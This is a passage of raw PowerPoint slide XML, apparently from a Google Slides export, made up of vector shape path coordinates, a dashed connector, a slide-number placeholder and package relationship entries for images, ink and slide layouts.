                    <a:pt x="1835" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="697" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="881" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="991" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1248" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1981" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="1467"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="1137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="2861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7520" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12069" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="4108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7850" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7153" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696"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sp>
          <p:nvSpPr>
            <p:cNvPr id="322" name="Google Shape;322;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="7109500" y="3449425"/>
              <a:ext cx="154100" cy="165100"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="6164" h="6604" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="3962" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3926" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="661" y="1614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="1798"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="2165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3375" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3815" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3852" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="844" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="1504"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="1614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="331" y="1945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="954" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="587" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="294" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="184" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1284" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2788" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="6163"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="5172"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="3375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6126" y="3118"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="2678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="2275"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="A4C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solidFill>
                  <a:srgbClr val="A4C2F4"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="323" name="Google Shape;323;p5"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1133967" y="1375233"/>
            <a:ext cx="8050400" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="19050" cap="rnd" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="A4C2F4"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="none" w="med" len="med"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="324" name="Google Shape;324;p5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="120825" y="6296983"/>
            <a:ext cx="7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a:fld id="{00000000-1234-1234-1234-123412341234}" type="slidenum">
              <a:rPr lang="en" smtClean="0"/>
              <a:pPr algn="l"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2623714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8/24/2025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B274D2D-08F2-062A-28BB-48891CE585C1}"/>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p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="6176963"/>
            <a:ext cx="12225864" cy="68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customXml" Target="../ink/ink5.xml"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image19.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image7.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink2.xml"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image16.png"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink7.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image10.png"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image18.png"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image20.png"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout6.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image100.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15.png"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink8.xml"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image8.svg"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink3.xml"/><Relationship Id="rId1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1.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customXml" Target="../ink/ink9.xml"/><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3.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customXml" Target="../ink/ink12.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customXml" Target="../ink/ink1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20.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image33.tif"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout6.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink16.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customXml" Target="../ink/ink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39.jpeg"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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customXml" Target="../ink/ink20.xml"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image301.png"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink25.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image34.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image341.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image270.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink22.xml"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image321.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image33.tif"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink24.xml"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml" Target="../ink/ink26.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" 